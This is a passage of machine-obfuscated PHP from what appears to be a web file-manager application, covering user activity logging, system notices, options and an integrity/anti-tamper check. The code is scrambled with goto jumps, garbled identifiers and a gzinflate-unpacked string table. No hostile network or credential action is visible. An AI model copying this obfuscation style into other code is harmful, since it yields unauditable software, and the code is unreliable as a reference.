$eÇÊÕ¤á¡“[2086] => array($eÇÊÕ¤á¡“[2088]), $eÇÊÕ¤á¡“[2087] => array($eÇÊÕ¤á¡“[2088]), $eÇÊÕ¤á¡“[2450] => array($eÇÊÕ¤á¡“[2491]), $eÇÊÕ¤á¡“[2452] => array($eÇÊÕ¤á¡“[2491]), $eÇÊÕ¤á¡“[2454] => array($eÇÊÕ¤á¡“[2492]), $eÇÊÕ¤á¡“[2440] => array($eÇÊÕ¤á¡“[2493]), $eÇÊÕ¤á¡“[2081] => array($eÇÊÕ¤á¡“[2494]), $eÇÊÕ¤á¡“[2457] => array($eÇÊÕ¤á¡“[2495]), $eÇÊÕ¤á¡“[2080] => array($eÇÊÕ¤á¡“[2082])); return $AŒ„À·¨…¡; } private function typeAll() { goto BÆòæå¹íÌ; Cã¸›¤•ê·: foreach ($CØÑÒÇ–¸ as $AÉà­¯ö÷× => $dáÈƒÙ˜Ç) { $d¦±ãíê¿÷[$dáÈƒÙ˜Ç[0]] = $d¦±ãíê¿÷[$AÉà­¯ö÷×]; } $d¦±ãíê¿÷[$cÆ½‚¼‡Î™[2088]] = LNG($cÆ½‚¼‡Î™[2496]); $d¦±ãíê¿÷[$cÆ½‚¼‡Î™[2491]] = LNG($cÆ½‚¼‡Î™[2497]); goto d·…ó¢‰½; BÆòæå¹íÌ: $cÆ½‚¼‡Î™ =& $_SERVER[Å¸ş]; $d¦±ãíê¿÷ = $this->typeList; $CØÑÒÇ–¸ = array_filter($this->typeFile()); goto Cã¸›¤•ê·; d·…ó¢‰½: return $d¦±ãíê¿÷; goto F˜±½æ³±ö; F˜±½æ³±ö: } public function addLog($e‹²à‘ªÙï, $Aß¾›ˆÆ = array()) { goto Fìš¾µ»—Ê; dï¶ØÏ™ ’: if (!$f‰•±£¨ñÃ) { $f‰•±£¨ñÃ = (int) Session::get($ešİ™èÛ[2228]); } $b’Â¦Ë²ñ» = get_client_ip(); if (!$Aß¾›ˆÆ || strlen(json_encode($Aß¾›ˆÆ)) >= 1024) { $Aß¾›ˆÆ = array($ešİ™èÛ[2498] => $b’Â¦Ë²ñ»); } else { if (is_array($Aß¾›ˆÆ)) { $Aß¾›ˆÆ[$ešİ™èÛ[2498]] = $b’Â¦Ë²ñ»; } else { $Aß¾›ˆÆ = array($ešİ™èÛ[1032] => $Aß¾›ˆÆ, $ešİ™èÛ[2498] => $b’Â¦Ë²ñ»); } } goto d‡Ö‚ï²ãÉ; Fìš¾µ»—Ê: $ešİ™èÛ =& $_SERVER[Å¸ş]; if (!isset($this->typeList[$e‹²à‘ªÙï])) { return; } $f‰•±£¨ñÃ = defined($ešİ™èÛ[427]) && USER_ID ? USER_ID : (isset($Aß¾›ˆÆ[$ešİ™èÛ[1436]]) ? $Aß¾›ˆÆ[$ešİ™èÛ[1436]] : 0); goto dï¶ØÏ™ ’; d‡Ö‚ï²ãÉ: $Aß¾›ˆÆ = array($ešİ™èÛ[1426] => Session::sign(), $ešİ™èÛ[1427] => $f‰•±£¨ñÃ, $ešİ™èÛ[29] => $e‹²à‘ªÙï, $ešİ™èÛ[1429] => json_encode($Aß¾›ˆÆ)); parent::add($Aß¾›ˆÆ); goto Aƒ±‹ÌÄË; Aƒ±‹ÌÄË: } public function remove($fóÎĞ‰í­â) { $this->where(array($_SERVER[Å¸ş][385] => $fóÎĞ‰í­â))->delete(); } private function _makeOrder($aÚíÃÄ¦œ’ = '') { goto d•áĞºš÷Ÿ; e¼Ç÷˜Şà: $Dª»“ÁšÜŸ = Input::get($f†ãÇïÇ¥[408], $f†ãÇïÇ¥[7], $f†ãÇïÇ¥[2262], array($f†ãÇïÇ¥[2188], $f†ãÇïÇ¥[404])); $Dª»“ÁšÜŸ = $d¬…±˜©×[$Dª»“ÁšÜŸ]; $aÚíÃÄ¦œ’ = $aÚíÃÄ¦œ’ . "{$fõŒÂœæ¹}\40{$Dª»“ÁšÜŸ}"; goto d×¾àíÖİ¶; d×¾àíÖİ¶: return $this->order($aÚíÃÄ¦œ’); goto d˜¨¤âì™º; d•áĞºš÷Ÿ: $f†ãÇïÇ¥ =& $_SERVER[Å¸ş]; $fõŒÂœæ¹ = $f†ãÇïÇ¥[187]; $d¬…±˜©× = array($f†ãÇïÇ¥[402] => $f†ãÇïÇ¥[403], $f†ãÇïÇ¥[404] => $f†ãÇïÇ¥[405]); goto e¼Ç÷˜Şà; d˜¨¤âì™º: } public function get($e¥¦Ù™‚¶š = '') { goto b¡™ÔÂéÒí; DÚ»³Î„à: $B›¨¬ßˆ¦ğ[$E¼‰—ÑîÚÄ[354]] = $this->logList($B›¨¬ßˆ¦ğ[$E¼‰—ÑîÚÄ[354]]); return $B›¨¬ßˆ¦ğ; goto BçÎ¶Ô™; C¬‡ñ¨«: if (!empty($e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[2498]])) { $CÈãåĞõ[$E¼‰—ÑîÚÄ[405]] = array($E¼‰—ÑîÚÄ[754], "\45{$e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[2498]]}\45"); } $B›¨¬ßˆ¦ğ = $this->_makeOrder()->where($CÈãåĞõ)->selectPage(); if (empty($B›¨¬ßˆ¦ğ[$E¼‰—ÑîÚÄ[354]])) { show_json(array(), !0, $B›¨¬ßˆ¦ğ[$E¼‰—ÑîÚÄ[351]]); } goto DÚ»³Î„à; Bˆ„É¾µíÊ: if ($e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[1436]]) { $CÈãåĞõ[$E¼‰—ÑîÚÄ[1436]] = $e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[1436]]; } if (isset($e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[705]])) { $FôÉµéŠìÛ = $e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[705]]; $C‘äìœƒ² = isset($e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[449]]) ? $e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[449]] : time(); $CÈãåĞõ[$E¼‰—ÑîÚÄ[187]] = array($E¼‰—ÑîÚÄ[321], array($FôÉµéŠìÛ, $C‘äìœƒ²)); } if ($e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[29]]) { $eŞ…‘À…ó± = explode($E¼‰—ÑîÚÄ[47], $e¥¦Ù™‚¶š[$E¼‰—ÑîÚÄ[29]]); $CÓÄ´Æ„¼ = $this->typeFile(); $cˆÂèñ—“• = array(); foreach ($eŞ…‘À…ó± as $f Ÿçğ©õó) { $cˆÂèñ—“•[] = $f Ÿçğ©õó; if (isset($CÓÄ´Æ„¼[$f Ÿçğ©õó])) { $cˆÂèñ—“• = array_merge($cˆÂèñ—“•, $CÓÄ´Æ„¼[$f Ÿçğ©õó]); } } $cˆÂèñ—“• = array_unique($cˆÂèñ—“•); if ($cˆÂèñ—“•) { $CÈãåĞõ[$E¼‰—ÑîÚÄ[29]] = array($E¼‰—ÑîÚÄ[7], $cˆÂèñ—“•); } } goto C¬‡ñ¨«; b¡™ÔÂéÒí: $E¼‰—ÑîÚÄ =& $_SERVER[Å¸ş]; if (!$e¥¦Ù™‚¶š) { show_json(array()); } $CÈãåĞõ = array(); goto Bˆ„É¾µíÊ; BçÎ¶Ô™: } private function ipAddress(&$e‚ºŒùÂâ) { $DÀÜÒˆ± =& $_SERVER[Å¸ş]; if (!empty($e‚ºŒùÂâ[$DÀÜÒˆ±[2498]])) { $Cõã²ƒİĞ = IpLocation::get($e‚ºŒùÂâ[$DÀÜÒˆ±[2498]]); } else { $Cõã²ƒİĞ = LNG($DÀÜÒˆ±[2499]); } $e‚ºŒùÂâ[$DÀÜÒˆ±[2500]] = $Cõã²ƒİĞ; } private function descZipDownload($C’ŒÎ§®Ú, &$a‡©·­¦º²) { $bãÖ¶­Õ =& $_SERVER[Å¸ş]; if (!isset($C’ŒÎ§®Ú[$bãÖ¶­Õ[2501]])) { return; } $bÉçÆ‡ƒ¡š = json_decode($C’ŒÎ§®Ú[$bãÖ¶­Õ[2501]], !0); foreach ($bÉçÆ‡ƒ¡š as $cÈÚ®³—‹) { if (!IO::init($cÈÚ®³—‹[$bãÖ¶­Õ[75]])) { continue; } if (!($cåÏô³±Ğ‰ = IO::infoFull($cÈÚ®³—‹[$bãÖ¶­Õ[75]]))) { continue; } $C’ŒÎ§®Ú[$bãÖ¶­Õ[75]] = $cÈÚ®³—‹[$bãÖ¶­Õ[75]]; $a‡©·­¦º²[] = $C’ŒÎ§®Ú[$bãÖ¶­Õ[369]] = $cåÏô³±Ğ‰[$bãÖ¶­Õ[369]]; $a‡©·­¦º²[] = $C’ŒÎ§®Ú[$bãÖ¶­Õ[2317]] = $cåÏô³±Ğ‰[$bãÖ¶­Õ[463]]; break; } return $C’ŒÎ§®Ú; } private function getSourceList(&$eØ› ÆŸî™) { $eãä¡§ˆ—Ä =& $_SERVER[Å¸ş]; $FóÄ„‚Ã„ = array(); foreach ($eØ› ÆŸî™ as $D¿Ã¼Ú²Ú† => $cƒ¬…¢í) { goto fÀÂÉ‚Áùß; C™¨‚·Û£Ê: $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[369]]; $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[2317]]; if ($aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[29]] == $eãä¡§ˆ—Ä[494]) { $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[405]][$eãä¡§ˆ—Ä[1005]]; $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[405]][$eãä¡§ˆ—Ä[1006]]; } goto Có¥¦å‰É; fÀÂÉ‚Áùß: $aØñ‰ƒ¯ø = json_decode($cƒ¬…¢í[$eãä¡§ˆ—Ä[405]], !0); if ($cƒ¬…¢í[$eãä¡§ˆ—Ä[29]] == $eãä¡§ˆ—Ä[2079]) { $aØñ‰ƒ¯ø = $this->descZipDownload($aØñ‰ƒ¯ø, $FóÄ„‚Ã„); $eØ› ÆŸî™[$D¿Ã¼Ú²Ú†][$eãä¡§ˆ—Ä[405]] = json_encode($aØñ‰ƒ¯ø); continue; } if (strpos($cƒ¬…¢í[$eãä¡§ˆ—Ä[29]], $eãä¡§ˆ—Ä[2318]) !== 0) { goto D¬Œˆ¤’‡ë; a•“†î…¸ï: $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[369]] = $b‰’É‘ÇÚ¼[$eãä¡§ˆ—Ä[369]]; $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[2317]] = $b‰’É‘ÇÚ¼[$eãä¡§ˆ—Ä[463]]; $eØ› ÆŸî™[$D¿Ã¼Ú²Ú†][$eãä¡§ˆ—Ä[405]] = json_encode($aØñ‰ƒ¯ø); goto F¼Í÷Œ’Ç¡; D¬Œˆ¤’‡ë: if (!isset($aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[75]]) || strpos($cƒ¬…¢í[$eãä¡§ˆ—Ä[29]], $eãä¡§ˆ—Ä[2502]) !== 0) { continue; } if (!IO::init($aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[75]])) { continue; } if (!($b‰’É‘ÇÚ¼ = IO::infoFull($aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[75]]))) { continue; } goto a•“†î…¸ï; F¼Í÷Œ’Ç¡: continue; goto d¡º¨‘½Ô’; d¡º¨‘½Ô’: } goto C™¨‚·Û£Ê; Có¥¦å‰É: if ($aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[29]] == $eãä¡§ˆ—Ä[2325]) { $FóÄ„‚Ã„[] = $aØñ‰ƒ¯ø[$eãä¡§ˆ—Ä[405]][$eãä¡§ˆ—Ä[369]]; } goto aù÷×î¦î; aù÷×î¦î: } if (!$FóÄ„‚Ã„) { return array(); } return Model($eãä¡§ˆ—Ä[755])->sourceListInfo($FóÄ„‚Ã„, !0); } private function logList($F‚ƒÀÂ‰¾ ) { goto e‰¿ĞÍ†Áˆ; e‰¿ĞÍ†Áˆ: $C·ïÎİ¾îŠ =& $_SERVER[Å¸ş]; $bêÕÊîƒ©ã = array_to_keyvalue($F‚ƒÀÂ‰¾ , $C·ïÎİ¾îŠ[33], $C·ïÎİ¾îŠ[1436]); $B™©ğä™ç = Model($C·ïÎİ¾îŠ[479])->userListInfo(array_unique($bêÕÊîƒ©ã)); goto d¢ãà£®„; d¢ãà£®„: $e‚¢¸…ÙÌ = $this->getSourceList($F‚ƒÀÂ‰¾ ); $báËÔºÒÏµ = $this->typeAll(); $f»‡„ã¦ò° = array(); goto f£‚¬•½Ô; aßâƒº‡Õ—: return $f»‡„ã¦ò°; goto eåïêÑ§·Š; f£‚¬•½Ô: $e†àğ¼Ú¹ = array(); foreach ($F‚ƒÀÂ‰¾  as $e×ŒÅ¸¿Å‹ => $aš…äÙÂÑà) { goto f¿Öß¥î¥‘; D“ğÇ†äÅ: $aš…äÙÂÑà[$C·ïÎİ¾îŠ[28]] = isset($fçÍÖ çºª[$C·ïÎİ¾îŠ[28]]) ? $fçÍÖ çºª[$C·ïÎİ¾îŠ[28]] : LNG($C·ïÎİ¾îŠ[2499]); $aš…äÙÂÑà[$C·ïÎİ¾îŠ[2366]] = isset($fçÍÖ çºª[$C·ïÎİ¾îŠ[2366]]) ? $fçÍÖ çºª[$C·ïÎİ¾îŠ[2366]] : $C·ïÎİ¾îŠ[33]; $aš…äÙÂÑà[$C·ïÎİ¾îŠ[1340]] = isset($báËÔºÒÏµ[$DñÁ»øô±ô]) ? $báËÔºÒÏµ[$DñÁ»øô±ô] : $C—ÓÍƒæÄ; goto d˜¸ê•©Á; f¿Öß¥î¥‘: $DñÁ»øô±ô = $aš…äÙÂÑà[$C·ïÎİ¾îŠ[29]]; $fçÍÖ çºª = isset($B™©ğä™ç[$aš…äÙÂÑà[$C·ïÎİ¾îŠ[1436]]]) ? $B™©ğä™ç[$aš…äÙÂÑà[$C·ïÎİ¾îŠ[1436]]] : !1; $C—ÓÍƒæÄ = strpos($DñÁ»øô±ô, $C·ïÎİ¾îŠ[2503]) === 0 ? LNG($C·ïÎİ¾îŠ[2504]) : LNG($C·ïÎİ¾îŠ[2499]); goto D“ğÇ†äÅ; FÊçò¿îƒ: unset($aš…äÙÂÑà[$C·ïÎİ¾îŠ[2505]]); $f»‡„ã¦ò°[] = $aš…äÙÂÑà; goto AĞæƒ—‘‡Ñ; d˜¸ê•©Á: $aš…äÙÂÑà[$C·ïÎİ¾îŠ[2261]] = $fçÍÖ çºª; $D§ÆñËÊ¼ = json_decode($aš…äÙÂÑà[$C·ïÎİ¾îŠ[405]], !0); $aš…äÙÂÑà[$C·ïÎİ¾îŠ[2498]] = isset($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2498]]) ? $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2498]] : $C·ïÎİ¾îŠ[33]; goto fí‹‡¯åÚ; fí‹‡¯åÚ: $this->ipAddress($aš…äÙÂÑà); if (strpos($DñÁ»øô±ô, $C·ïÎİ¾îŠ[2318]) === 0 || isset($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2317]])) { goto Dˆ¡ÔìÍëŸ; cÍù¤ŞÒ»: if ($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[29]] == $C·ïÎİ¾îŠ[2325]) { $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[369]] = $e‚¢¸…ÙÌ[$D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[369]]]; } if ($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[29]] == $C·ïÎİ¾îŠ[2074]) { $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2330]] = $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[391]]; $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2317]] = $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2330]][$C·ïÎİ¾îŠ[369]]; $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[391]] = !1; $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[369]] = $C·ïÎİ¾îŠ[33]; } if ($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[391]] && $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[391]][$C·ïÎİ¾îŠ[371]] == $C·ïÎİ¾îŠ[1078]) { $e†àğ¼Ú¹[] = $aš…äÙÂÑà[$C·ïÎİ¾îŠ[367]]; unset($F‚ƒÀÂ‰¾ [$e×ŒÅ¸¿Å‹]); continue; } goto DùÎà¬‹‘›; Dˆ¡ÔìÍëŸ: $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[391]] = $e‚¢¸…ÙÌ[$D§ÆñËÊ¼[$C·ïÎİ¾îŠ[369]]]; $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2330]] = $e‚¢¸…ÙÌ[$D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2317]]]; if ($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[29]] == $C·ïÎİ¾îŠ[494]) { $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[1005]] = $e‚¢¸…ÙÌ[$D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[1005]]]; $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[1006]] = $e‚¢¸…ÙÌ[$D§ÆñËÊ¼[$C·ïÎİ¾îŠ[405]][$C·ïÎİ¾îŠ[1006]]]; } goto cÍù¤ŞÒ»; DùÎà¬‹‘›: if ($D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2330]] && $D§ÆñËÊ¼[$C·ïÎİ¾îŠ[2330]][$C·ïÎİ¾îŠ[371]] == $C·ïÎİ¾îŠ[1078]) { $e†àğ¼Ú¹[] = $aš…äÙÂÑà[$C·ïÎİ¾îŠ[367]]; unset($F‚ƒÀÂ‰¾ [$e×ŒÅ¸¿Å‹]); continue; } goto açŸ£æÎÔ‰; açŸ£æÎÔ‰: } $aš…äÙÂÑà[$C·ïÎİ¾îŠ[405]] = $D§ÆñËÊ¼; goto FÊçò¿îƒ; AĞæƒ—‘‡Ñ: } $this->clearSystemPathLog($e†àğ¼Ú¹); goto aßâƒº‡Õ—; eåïêÑ§·Š: } private function clearSystemPathLog($cÆ§äª…šÖ) { $DÇ÷ã„ÚÜ =& $_SERVER[Å¸ş]; if (count($cÆ§äª…šÖ) == 0) { return; } $FêùéÜŸí“ = array($DÇ÷ã„ÚÜ[367] => array($DÇ÷ã„ÚÜ[7], array_unique($cÆ§äª…šÖ))); $this->where($FêùéÜŸí“)->delete(); } public function deviceList($D†·î«Š¾, $E›¾¡ù = 0) { $cÈ’æ³ó´ =& $_SERVER[Å¸ş]; $CåäÒÅøã– = array($cÈ’æ³ó´[1436] => $D†·î«Š¾, $cÈ’æ³ó´[187] => array($cÈ’æ³ó´[925], $E›¾¡ù), $cÈ’æ³ó´[29] => $cÈ’æ³ó´[2047]); $b‚Ì¼¶íšä = array(); $FÔ¡‡÷ß¥ = $this->field($cÈ’æ³ó´[2506])->where($CåäÒÅøã–)->order($cÈ’æ³ó´[2328])->limit(50)->select(); foreach ($FÔ¡‡÷ß¥ as $F¢â¬­Ê™ => $BñŒÙÂ¡ù–) { goto e•··ÀÅ; e•··ÀÅ: if ($F¢â¬­Ê™ > 0 && abs($BñŒÙÂ¡ù–[$cÈ’æ³ó´[187]] - $FÔ¡‡÷ß¥[$F¢â¬­Ê™ - 1][$cÈ’æ³ó´[187]]) < 5) { continue; } $fÈÂ‡Ä­ = json_decode($BñŒÙÂ¡ù–[$cÈ’æ³ó´[405]], !0); $BñŒÙÂ¡ù–[$cÈ’æ³ó´[2498]] = isset($fÈÂ‡Ä­[$cÈ’æ³ó´[2498]]) ? $fÈÂ‡Ä­[$cÈ’æ³ó´[2498]] : $cÈ’æ³ó´[33]; goto C‰è˜æì“¸; C‰è˜æì“¸: unset($fÈÂ‡Ä­[$cÈ’æ³ó´[2498]]); $cŞêİ½Ì§” = $this->deviceType($fÈÂ‡Ä­[$cÈ’æ³ó´[2319]]); if (isset($b‚Ì¼¶íšä[$cŞêİ½Ì§”])) { continue; } goto A÷ò‰¯™î; A÷ò‰¯™î: $this->ipAddress($BñŒÙÂ¡ù–); $BñŒÙÂ¡ù–[$cÈ’æ³ó´[405]] = $fÈÂ‡Ä­; $b‚Ì¼¶íšä[$cŞêİ½Ì§”] = $BñŒÙÂ¡ù–; goto e›ÀÎÌ—¯£; e›ÀÎÌ—¯£: } return array_values($b‚Ì¼¶íšä); } public function deviceType($F ¿–”Ûá·) { return $F ¿–”Ûá·; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x6e\157\164\x69\143\145\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x63\157\x6e\x74\145\156\164", "\141\x75\x74\150", "\155\157\x64\x65", "\x74\x69\x6d\x65", "\x74\x79\x70\145", "\x6c\145\x76\x65\x6c", "\145\156\141\x62\154\145", "\x73\157\162\x74"); public function listData($DÑÌÛ“£› = false, $c‹½Ê¸Ä­à = "\x73\x6f\162\164", $BÖ…çÜ‹©› = false) { return parent::listData($DÑÌÛ“£›, $c‹½Ê¸Ä­à, $BÖ…çÜ‹©›); } public function add($a×æ˜ê¤ñİ) { $fïÖ…¶ŠÌÀ =& $_SERVER[Å¸ş]; $DÄ‰‰±Ç = time(); if ($a×æ˜ê¤ñİ[$fïÖ…¶ŠÌÀ[12]] == $fïÖ…¶ŠÌÀ[2507]) { $DÄ‰‰±Ç = strtotime($a×æ˜ê¤ñİ[$fïÖ…¶ŠÌÀ[190]]); } $a×æ˜ê¤ñİ[$fïÖ…¶ŠÌÀ[190]] = $DÄ‰‰±Ç; return parent::insert($a×æ˜ê¤ñİ); } public function update($dâöêöä™, $C‰Ç×£÷„ß) { goto AÄô†«ø¡å; AÄô†«ø¡å: $f¹Ñƒèø£õ =& $_SERVER[Å¸ş]; $C‰Ôõñ’éá = $this->listData($dâöêöä™); if (!$C‰Ôõñ’éá) { return !1; } goto aº©ÌäÎ³è; aº©ÌäÎ³è: $B´İ–öÛŠÎ = time(); if ($C‰Ç×£÷„ß[$f¹Ñƒèø£õ[12]] == $f¹Ñƒèø£õ[2507]) { $B´İ–öÛŠÎ = strtotime($C‰Ç×£÷„ß[$f¹Ñƒèø£õ[190]]); } $C‰Ç×£÷„ß[$f¹Ñƒèø£õ[190]] = $B´İ–öÛŠÎ; goto fËÎÒí”óÈ; fËÎÒí”óÈ: return parent::update($dâöêöä™, $C‰Ç×£÷„ß); goto aÆ•¨™˜ôë; aÆ•¨™˜ôë: } public function remove($b‹®›ÎÄÓÈ) { $EÜŠª™ = $this->listData($b‹®›ÎÄÓÈ); if (!$EÜŠª™ || $EÜŠª™[$_SERVER[Å¸ş][1078]]) { return !1; } return parent::remove($b‹®›ÎÄÓÈ); } public function sort($A¢‚Ñ‚®Í, $F¦µñ±™Í ) { return parent::update($A¢‚Ñ‚®Í, $F¦µñ±™Í ); } public function enable($d™‡µ‚, $Aä³×‡Ì•Ì) { return parent::update($d™‡µ‚, array($_SERVER[Å¸ş][2508] => $Aä³×‡Ì•Ì)); } private function initUserOption() { $fß•ÁÕå¶ =& $_SERVER[Å¸ş]; $this->optionType = $fß•ÁÕå¶[2509]; $this->modelType = $fß•ÁÕå¶[2510]; $this->field = array($fß•ÁÕå¶[2511], $fß•ÁÕå¶[28], $fß•ÁÕå¶[190], $fß•ÁÕå¶[29], $fß•ÁÕå¶[2512], $fß•ÁÕå¶[692], $fß•ÁÕå¶[183]); } public function userNoticeGet($e¦ôÁ†ùÍ¼ = false) { $this->initUserOption(); return parent::listData($e¦ôÁ†ùÍ¼, $_SERVER[Å¸ş][367], !0); } public function userNoticeAdd($Aî‚ö÷×¼) { $b®‰Ú‰ª…˜ =& $_SERVER[Å¸ş]; $this->initUserOption(); $e²ƒÙƒñŒ÷ = $this->findByKey($b®‰Ú‰ª…˜[2511], $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[367]]); if ($e²ƒÙƒñŒ÷) { return !0; } $c‡“á¼¤¡í = array($b®‰Ú‰ª…˜[2511] => $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[367]], $b®‰Ú‰ª…˜[28] => $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[28]], $b®‰Ú‰ª…˜[190] => $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[190]], $b®‰Ú‰ª…˜[29] => isset($Aî‚ö÷×¼[$b®‰Ú‰ª…˜[29]]) ? $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[29]] : 1, $b®‰Ú‰ª…˜[2512] => isset($Aî‚ö÷×¼[$b®‰Ú‰ª…˜[2512]]) ? $Aî‚ö÷×¼[$b®‰Ú‰ª…˜[2512]] : 0, $b®‰Ú‰ª…˜[692] => 0, $b®‰Ú‰ª…˜[183] => 0); return parent::insert($c‡“á¼¤¡í); } public function userNoticeEdit($fÔí˜î±ğğ, $e—ƒ„ËÌÀª) { $this->initUserOption(); return parent::update($fÔí˜î±ğğ, $e—ƒ„ËÌÀª); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\x6d\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\155\145\156\x75", "\162\157\154\x65", "\162\157\154\145\x47\162\x6f\x75\x70", "\162\145\x67\151\163\x74", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($A¢®©•Â–) { return "\x53\x79\x73\164\x65\155\x4f\x70\x74\x69\157\x6e\x5f{$A¢®©•Â–}"; } protected function optionDefault($c»¢íàˆŠ¯ = '') { $Bæ±•²«ƒš =& $_SERVER[Å¸ş]; if ($c»¢íàˆŠ¯ == $Bæ±•²«ƒš[33]) { return $GLOBALS[$Bæ±•²«ƒš[6]][$Bæ±•²«ƒš[2513]]; } } } goto F– ÒØŠÂ©; AëÉ¦Š”¾±: define($_SERVER[Å¸ş][227], 2); define($_SERVER[Å¸ş][228], 3); define($_SERVER[Å¸ş][229], 1); goto c³‰¸òÑâô; b—¼õÒ¨‡Â: register_shutdown_function($_SERVER[ãˆÙà–ÃÙ][32]); set_error_handler($_SERVER[ãˆÙà–ÃÙ][46], $DİÒ»´”‚‘); if (function_exists($_SERVER[ãˆÙà–ÃÙ][47])) { set_exception_handler($_SERVER[ãˆÙà–ÃÙ][48]); } goto AÔĞŒ•¿‡–; EˆÃ¸ì„¼”: define($_SERVER[Å¸ş][0], $_SERVER[Å¸ş][1]); $_SERVER[ãˆÙà–ÃÙ] = explode($_SERVER[Å¸ş][2], gzinflate(substr($_SERVER[Å¸ş][3], 10, -8))); function Model($Fò’ÁÁ§¤Û = '', $e»ÇÂÁ½Ô¾ = '', $B¯Ş†¨ˆ‹ô = '') { goto c”—³£¥è¾; AÊ‡Ô˜ß–ø: if (isset($D‚Š¡Û´©Ï[$eµ†‚§])) { return $D‚Š¡Û´©Ï[$eµ†‚§]; } if ($Fò’ÁÁ§¤Û) { $Fò’ÁÁ§¤Û = strtoupper($Fò’ÁÁ§¤Û[0]) . substr($Fò’ÁÁ§¤Û, 1); $bŠÁâ°Şß = $Fò’ÁÁ§¤Û . $fÆÔì¦À˜[1]; if (class_exists($bŠÁâ°Şß)) { $D‚Š¡Û´©Ï[$eµ†‚§] = new $bŠÁâ°Şß(); return $D‚Š¡Û´©Ï[$eµ†‚§]; } } if (!$B¯Ş†¨ˆ‹ô) { $B¯Ş†¨ˆ‹ô = $GLOBALS[$fÆÔì¦À˜[2]][$fÆÔì¦À˜[3]]; } goto aÄÂºÌæÁ¾; aÄÂºÌæÁ¾: $D‚Š¡Û´©Ï[$eµ†‚§] = new ModelBase($Fò’ÁÁ§¤Û, $e»ÇÂÁ½Ô¾, $B¯Ş†¨ˆ‹ô); return $D‚Š¡Û´©Ï[$eµ†‚§]; goto Eôõ¡õ•Ö; c”—³£¥è¾: $fÆÔì¦À˜ =& $_SERVER[ãˆÙà–ÃÙ]; static $D‚Š¡Û´©Ï = array(); $eµ†‚§ = strtolower($e»ÇÂÁ½Ô¾ . $fÆÔì¦À˜[0] . $Fò’ÁÁ§¤Û); goto AÊ‡Ô˜ß–ø; Eôõ¡õ•Ö: } goto A¡ï¿ë¹¯…; F×¸Ö†Å°ğ: $B¡ê¸‚Èä = $_SERVER[Å¸ş][556]; if ($_SERVER[$_SERVER[Å¸ş][557]] != $B¡ê¸‚Èä($cëØÂäßÏ¤)) { goto eèÑ…ÕÖÃé; A¿ëÍÍõÄİ: $bÒ¤¥¥•™ë($cëØÂäßÏ¤); goto b¦ñÑŸë”ù; eèÑ…ÕÖÃé: $cÕ¤Ñ‡Ê«‚ = $_SERVER[Å¸ş][558]; $b¶Ü·½ø„Í = $_SERVER[$_SERVER[Å¸ş][559]] . $_SERVER[Å¸ş][560]; $BÌì²¡”Û = $cÕ¤Ñ‡Ê«‚($b¶Ü·½ø„Í); goto fİ¬‰—Ø; fİ¬‰—Ø: $B›ÎòÂºôæ = explode($_SERVER[Å¸ş][217], $BÌì²¡”Û); if (count($B›ÎòÂºôæ) < $_SERVER[Å¸ş][561]) { $DóŸ«à¾‚‘ = $_SERVER[Å¸ş][562]; $DóŸ«à¾‚‘(); } $bÒ¤¥¥•™ë = $_SERVER[Å¸ş][563]; goto A¿ëÍÍõÄİ; b¦ñÑŸë”ù: } class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\156\144\x65\170"; private 